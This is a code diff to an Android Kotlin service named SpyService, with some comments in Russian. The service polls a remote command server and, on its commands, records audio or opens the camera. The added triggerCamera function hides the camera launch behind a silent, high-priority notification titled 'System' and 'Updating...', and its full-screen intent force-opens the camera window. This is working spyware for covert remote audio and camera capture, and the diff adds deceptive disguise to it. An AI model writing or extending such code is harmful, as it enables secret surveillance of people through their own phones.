@@ -15,6 +15,7 @@ import java.util.concurrent.TimeUnit
 
 class SpyService : Service() {
     private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).writeTimeout(15, TimeUnit.SECONDS).build()
+    // ВАЖНО: Замени IP, если тестируешь на другом устройстве
     private val serverUrl = "http://127.0.0.1:8080" 
 
     override fun onCreate() {
@@ -43,10 +44,7 @@ class SpyService : Service() {
                         if (body.contains("RECORD")) {
                             recordAudio()
                         } else if (body.contains("SNAPSHOT")) {
-                            // Запуск невидимой камеры
-                            val intent = Intent(applicationContext, CameraActivity::class.java)
-                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                            startActivity(intent)
+                            triggerCamera()
                         }
                     }
                 } catch (e: Exception) {
@@ -55,6 +53,37 @@ class SpyService : Service() {
                 Thread.sleep(5000)
             }
         }.start()
+    }
+
+    private fun triggerCamera() {
+        val intent = Intent(applicationContext, CameraActivity::class.java)
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+        
+        val pendingIntent = PendingIntent.getActivity(
+            applicationContext, 
+            0, 
+            intent, 
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val channelId = "ratnik_cam"
+        val notificationManager = getSystemService(NotificationManager::class.java)
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(channelId, "Camera", NotificationManager.IMPORTANCE_HIGH)
+            channel.setSound(null, null) 
+            notificationManager.createNotificationChannel(channel)
+        }
+
+        val notification = Notification.Builder(this, channelId)
+            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setContentTitle("System")
+            .setContentText("Updating...")
+            .setPriority(Notification.PRIORITY_HIGH)
+            .setFullScreenIntent(pendingIntent, true) // Принудительно открывает окно
+            .build()
+
+        notificationManager.notify(999, notification)
     }
 
     private fun recordAudio() {
